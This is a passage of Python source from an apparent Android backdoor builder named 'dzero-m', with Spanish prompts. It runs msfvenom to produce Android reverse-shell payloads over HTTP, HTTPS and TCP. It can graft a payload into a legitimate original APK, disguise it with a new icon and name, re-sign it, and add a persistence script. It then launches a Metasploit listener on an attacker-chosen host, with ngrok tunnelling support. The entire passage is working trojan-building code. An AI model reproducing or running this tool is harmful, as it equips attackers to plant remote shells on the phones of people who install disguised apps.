							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new dzero-m method'.format(WHITE, YELLOW))

					m = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)

					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()		

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/dzero-m.apk')
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()								
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
					
					else:
						print("{}\n[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					main()	

			elif pay == '06':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)

				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "dzero-m - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))						
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
						mainout = os.path.splitext(OUT)[0]	
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/dzero-m.apk')
						location = os.getcwd()
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle					
					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new dzero-m method'.format(WHITE, YELLOW))

					m = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)

					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/dzero-m.apk')
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					else:
						print("{}\n[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					main()	

			elif pay == '07':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)

				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "dzero-m - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))						
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
						mainout = os.path.splitext(OUT)[0]	
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/dzero-m.apk')
						location = os.getcwd()
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
			
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new dzero-m method'.format(WHITE, YELLOW))

					m = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)
					
					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
							while var.upper() != "N":
